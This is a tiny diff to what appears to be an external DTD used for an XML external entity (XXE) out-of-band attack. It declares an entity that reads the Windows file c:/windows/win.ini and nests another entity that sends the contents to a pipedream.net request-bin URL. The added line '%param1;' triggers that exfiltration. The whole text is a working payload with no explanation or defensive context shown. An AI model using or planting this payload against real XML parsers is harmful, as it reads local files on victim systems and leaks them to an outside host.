@@ -1,3 +1,4 @@
 <?xml version="1.0" encoding="utf-8" ?>
 <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
 <!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'https://enllfgxx7hk1e.x.pipedream.net/?%data;'>">
+%param1;
